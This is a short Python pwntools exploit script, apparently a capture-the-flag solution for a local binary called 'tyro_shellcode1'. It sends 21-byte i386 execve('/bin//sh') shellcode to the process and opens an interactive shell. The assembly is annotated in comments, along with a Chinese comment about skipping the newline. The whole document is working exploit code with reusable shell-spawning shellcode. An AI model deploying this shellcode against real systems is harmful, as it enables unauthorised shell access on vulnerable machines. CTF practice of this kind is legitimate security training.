#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = process("./tyro_shellcode1")

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
#xor ecx, ecx
#mul ecx
#mov al, 0Bh
#push ecx
#push 68732F2Fh
#push 6E69622Fh
#mov ebx, esp
#int 80h

print io.recv()
io.send(shellcode)			#使用read读取，不需要在输入后加换行符'\n'，节省一个字节的空间
io.interactive()